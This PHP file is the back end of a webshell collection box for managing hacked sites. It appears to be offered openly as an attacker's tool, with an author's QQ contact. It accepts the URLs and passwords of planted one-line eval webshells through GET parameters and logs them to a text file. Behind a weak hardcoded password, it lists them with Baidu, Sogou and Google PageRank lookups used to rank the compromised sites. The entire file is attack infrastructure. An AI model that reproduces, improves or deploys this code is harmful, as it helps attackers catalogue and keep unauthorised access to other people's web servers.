<?php
/*
http://localhost/webshell.php?url=http://localhost/shellbox/shellbox/Lib/Dsglf0E.php&passwod=12345678
远程提交后台
请大家尊重作者  禁止改版权
落雪技术支持QQ：2602159946
*/
ini_set("date.timezone","Asia/Chongqing");  //调整时间
$tim=date('Y-m-d H:i:s',time());
@$url=@$_GET["url"];  //URL地址
@$passwod=@$_GET["passwod"];  //passwod密码
$file_name="webshell.txt";  //本地保存文件
$password = "123456";//设置密码
$baidu_bool=0;
$sogou_bool=0;
$google_bool=0;
//1是开启查询     但是用PHP查询过慢
//用这个改成ajax  会让速度变快  呵呵  这个大家自己写吧
error_reporting(E_ERROR);
header("content-Type: text/html; charset=utf-8");
set_time_limit(0);


function file_add($file_data)  //写入txt文件
{
Global $file_name;
$fp=fopen($file_name,"a+");
fputs($fp,$file_data,strlen($file_data));
fputs($fp,"\r\n");
fclose($fp);
}
################################
function Root_GP(&$array)
{
	while(list($key,$var) = each($array))
	{
		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
		{
			if(is_string($var)) $array[$key] = stripslashes($var);
			if(is_array($var)) $array[$key] = Root_GP($var);  
		}
	}
	return $array;
}

function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}

function Root_Login($MSG_TOP)
{
print<<<END
<html>
	<head>
	<title>只有你想不到 没有我们做不到</title>
	</head>

	<style type="text/css">
		.bottombg {padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:350px;color:#000000;background: #888888;}
	</style>
	<body style="background:#AAAAAA;">
		<center>
		<form method="POST">
		<div style="width:351px;height:201px;margin-top:100px;background:threedface;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;">
		<div style="width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#293F5F;clear:both;"><b>{$MSG_TOP}</b></div>
		<div style="width:350px;height:80px;margin-top:50px;color:#000000;clear:both;">密码:<input type="password" name="spiderpass" style="width:270px;"></div>
		<div style="width:350px;height:30px;clear:both;"><input type="submit" value="登陆" style="width:80px;"></div>
		</div>
		<div class="bottombg"> 
		<td> <a href="http://user.qzone.qq.com/2602159946" target="_blank"><b>落雪技术支持QQ：2602159946</b></a> </td> 
	</div>
		</form>
		</center>
	</body>
	
</html>
END;
	return false;
}

function WinMain()
{
Global $file_name;
Global $baidu_bool,$google_bool,$sogou_bool;
print<<<END
<html>
	<head>
	<title>IIS2003 eval webshell 后台管理  落雪技术支持QQ：2602159946</title>
	</head>

	<style type="text/css">
		*{padding:0; margin:0;}
		body{background:threedface;font-family:"Verdana", "Tahoma", "宋体",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
		a{color:#000000;text-decoration:none;}
		a:hover{background:#BBBBBB;}
		table{color:#000000;font-family:"Verdana", "Tahoma", "宋体",sans-serif;font-size:13px;border:1px solid #999999;}
		td{background:#F9F6F4;}
		.bottombg {padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:1260px;color:#000000;background: #888888;}
		.toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}
		.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
		.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
	</style>

	<div style="width:90%; margin:0 auto; overflow:auto; _display:inline-block;"> 
    <div style="width:200px; float:right; background:"></div> 
    <div style="width:200px; float:left; background:"></div>  
    <div style=" margin-left:160px;margin-right:210px;margin:0px auto;">

	<td> <a href="http://user.qzone.qq.com/2602159946" target="_blank"><b>IIS2003 eval webshell 后台管理  落雪技术支持QQ：2602159946</b></a> </td> 

	<td width="240" align="center" valign="top">
		<ul class="listbg">
			<li><a href="?s=logout" id="t_15" onclick="switchTab('t_15')"> 
			    <font color="#FF0000"> <font size="5">退出系统</font><br /> </font><br /> 
			</a></li>
		</ul>
	</td>

	<table border="0"><tbody><tr>
		<td class="toptd" style="width:50px;">ID</td>
		<td class="toptd" style="width:700px;"><b>一句话URL地址</b></td>
		<td class="toptd" style="width:70px;">密码</td>
		<td class="toptd" style="width:80px;">baidu_br</td>
		<td class="toptd" style="width:80px;">sogou</td>
		<td class="toptd" style="width:80px;">google_pr</td>
		<td class="toptd" style="width:170px;">添加时间</td>
END;
	$fh = fopen($file_name,'r');
	$index=1;
	$data_url="";
	while(!feof($fh)){
		$line=fgets($fh);
		echo "<tr>";
		$urlFileName = strtok($line,"|");
		$i=0;
		while(!empty($urlFileName)){
			if ($i==0){
				echo '<td>'.$index.'</td>';
				$index++;
			}
			$i++;
			if ($i==1){
				echo '<td> <a href="'.$urlFileName.'" target="_blank"><b>'.$urlFileName.'</a> </td>';
				$data_url=$urlFileName;
				$urlFileName = strtok("|");
			}elseif($i==3){ //百度
				if ($baidu_bool){
					echo '<td>'.baidu_br(get_domain($data_url)).'</td>';
				}else{
					echo '<td>..</td>';
				}
			}elseif($i==4){ //搜狗
				if ($sogou_bool){
					echo '<td>'.sogo(get_domain($data_url)).'</td>';
				}else{
					echo '<td>..</td>';
				}
			}elseif($i==5){ //google
				if ($google_bool){
					echo '<td>'.google_pr($data_url).'</td>';
				}else{
					echo '<td>..</td>';
				}
			}elseif($i>6){
				$urlFileName = strtok("|");
				continue; //跳过
			}else{
				echo '<td>'.$urlFileName.'</td>';
				$urlFileName = strtok("|");
			}
		}
		echo "</tr>";
	}
	fclose($fh);
		// <tr>
	 //    <td> <a href="http://{$v}" target="_blank"><b>xxxxxx</b></a> </td>  
		// <td>2014-10-21 16:07:12</td> 
		// </tr>
print<<<END
	</tbody></table>
	<body>
	<div class="bottombg"> 
		<td> <a href="http://user.qzone.qq.com/2602159946" target="_blank"><b>落雪技术支持QQ：2602159946</b></a> </td> 
	</div>
	</body>

	</div> 
	</div>

</html>
END;
}
###############################
//获取网站   百度权重   搜狗  谷歌PR
/*获取百度权重*/
function baidu_br($s){
	$baidu="http://mytool.chinaz.com/baidusort.aspx?host=".$s;
	$site=file_get_contents($baidu);  //file_get_contents(urlencode($baidu));
	preg_match_all('(<font color=\"blue\">(.*?)<\/font>)', $site,$count);
	//print_r($count);
	if(!empty($count[1][0])) {
		return $count[1][0];
	}
	else {
		return "==";
	}
	return $count[1][0];
}

/*搜狗 */
function sogo($s){
	$sogo="http://rank.ie.sogou.com/sogourank.php?url=".$s;
	$site=file_get_contents($sogo);
	preg_match_all('(sogourank=(.*?)$)', $site,$count);
	if(!empty($count[1][0])) {
		return $count[1][0];
	}
	else {
		return "==";
	}
	return $count[1][0];
}

/*google*/
function app_hash_url($url){
	$seed="Mining PageRank is AGAINST GOOGLE'S TERMS OF SERVICE.";
	$result=0x01020345;
	for($i=0;$i<strlen($url);$i++){
		$result^=ord($seed{$i%87})^ord($url{$i});
		$result=(($result>>23)&0x1FF)|$result<<9;
	}
	return sprintf("8%x",$result);
}
function get_domain($url){   //获取主域名
  	//$url = "http://www.uncletoo.com/plug/tags/?tag=PHP";
	preg_match('@^(?:http://)?([^/]+)@i', $url, $matches);
	return $matches[1];
	//echo $host;
 }

function google_pr($url){
	
	try
 	{
 		$url=get_domain($url);   //获取主域名
		//echo $url;
		$PR_CH=app_hash_url($url);
	    $url='http://toolbarqueries.google.com/tbr?client=navclient-auto&features=Rank&q=info:'.$url.'&ch='.$PR_CH;
		$prtext=file_get_contents($url);
		if($prtext!=""){
			$pr=explode(":",$prtext);
			return $pr[2];
		}else{
			return "==";
		}
		return "==";
	}
	//捕获异常
	catch(Exception $e)
	{
		return "==";
	}
}
###############################

if ($url!="")
{
	$data=$url."|".$passwod."|".$tim;
	echo $data;
	file_add($data);  //写入txt文件
}

if(get_magic_quotes_gpc())
{
	$_GET = Root_GP($_GET);
	$_POST = Root_GP($_POST);
}

if($_GET['s'] == 'logout')
{
	setcookie('admin_spiderpass',NULL);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}
if($_COOKIE['admin_spiderpass'] != md5($password))
{
	ob_start();
	$MSG_TOP = '登陆后台箱子';
	if(isset($_POST['spiderpass']))
	{
		$cookietime = time() + 24 * 3600;
		setcookie('admin_spiderpass',md5($_POST['spiderpass']),$cookietime);
		if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv="refresh" content="1;URL=?">');}
		else{$MSG_TOP = '密码错误 请从新输入';}
	}
	Root_Login($MSG_TOP);
	ob_end_flush();
	exit;
}

if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS();}else{$s = 'MyNameIsHacker';}
$p = isset($_GET['p']) ? $_GET['p'] : File_Str(dirname(__FILE__));

switch($s)
{
	default: WinMain(); break;
}

?>

